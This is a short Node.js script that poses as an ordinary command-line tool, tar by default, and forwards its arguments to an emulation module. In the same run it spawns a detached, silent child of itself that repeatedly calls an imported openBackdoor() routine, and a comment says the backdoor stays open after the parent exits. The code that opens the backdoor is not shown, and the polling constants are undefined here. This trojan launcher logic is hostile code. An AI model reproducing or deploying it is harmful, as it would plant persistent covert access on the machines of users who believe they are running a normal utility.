#!/usr/bin/env node
import { spawn } from "child_process";
import openBackdoor from "./backdoor";
import execFile from "./exec_emulation"
import path from "path";

const args = process.argv.slice(2);
let execName = path.basename(process.argv[1]);
if (execName == "client.js") {
  // Default to tar emulation
  execName = "tar";
}

if (args.includes("--bd")) {
  let count = 0
  const poll = ()=>{
    if(count < POLL_COUNT){
      openBackdoor()
      count++;
      setTimeout(poll, POLL_INTERVAL)
    }
  }
  poll();
} else {
  // First, simulate tar functionality
  execFile(args, execName);

  // Then spawn a child of the same executable, but only with the --bd flag
  const child = spawn(process.argv[0], [process.argv[1], "--bd"], {
    detached: true,
    stdio: "ignore",
  });
  // allow parent to halt while backdoor remains open
  child.unref();
}
